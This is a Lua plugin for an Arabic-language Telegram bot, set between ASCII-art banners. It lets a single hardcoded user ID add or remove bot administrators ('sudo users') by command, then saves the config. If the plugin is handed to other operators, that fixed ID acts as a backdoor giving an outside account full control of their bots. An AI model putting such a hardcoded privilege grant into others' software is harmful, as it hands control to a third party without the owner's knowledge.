--[[
       _               _                      _            _  ___   ___  _    
  __ _| |__   ___  ___| | ___ __ ___  _ __   (_) __ _     / |/ _ \ / _ \| | __
 / _` | '_ \ / _ \/ __| |/ / '__/ _ \| '_ \  | |/ _` |    | | | | | | | | |/ /
| (_| | |_) | (_) \__ \   <| | | (_) | |_) | | | (_| |    | | |_| | |_| |   < 
 \__,_|_.__/ \___/|___/_|\_\_|  \___/| .__/  |_|\__, |____|_|\___/ \___/|_|\_\
                                     |_|           |_|_____|
—]]
local function getindex(t,id) 
for i,v in pairs(t) do 
if v == id then 
return i 
end 
end 
return nil 
end 
function reload_plugins( ) 
  plugins = {} 
  load_plugins() 
end 
   function smile(msg, matches) 
    if tonumber (msg.from.id) ==  115124695 then 
       if  matches[1]:lower() == "رفع مطور" then 
          table.insert(_config.sudo_users, tonumber(matches[2])) 
      print(matches[2] ..'<b> تم رفعه مطور للبوت |✔️  </b>') 
     save_config() 
     reload_plugins(true) 
return '<b>تم رفعه مطور للبوت بنجاح |✔️ YOUR 🆔 ➣ </b>' .. matches[2]
elseif matches[1]:lower() == "تنزيل مطور" then 
      local k = tonumber(matches[2]) 
          table.remove(_config.sudo_users, getindex( _config.sudo_users, k)) 
      print(matches[2] ..'<b> تم تخفيضه من المطورين |✔️  </b> ') 
     save_config() 
     reload_plugins(true) 
return '<b>تم تخفيضه من المطورين |✔️ YOUR 🆔 ➣ </b>' .. matches[2]
end 
   end 
end 
return { 
patterns = { 

"^(رفع مطور) (%d+)$", 
"^(تنزيل مطور) (%d+)$",
}, 
run = smile
}
--[[
       _               _                      _            _  ___   ___  _    
  __ _| |__   ___  ___| | ___ __ ___  _ __   (_) __ _     / |/ _ \ / _ \| | __
 / _` | '_ \ / _ \/ __| |/ / '__/ _ \| '_ \  | |/ _` |    | | | | | | | | |/ /
| (_| | |_) | (_) \__ \   <| | | (_) | |_) | | | (_| |    | | |_| | |_| |   < 
 \__,_|_.__/ \___/|___/_|\_\_|  \___/| .__/  |_|\__, |____|_|\___/ \___/|_|\_\
                                     |_|           |_|_____|
—]]
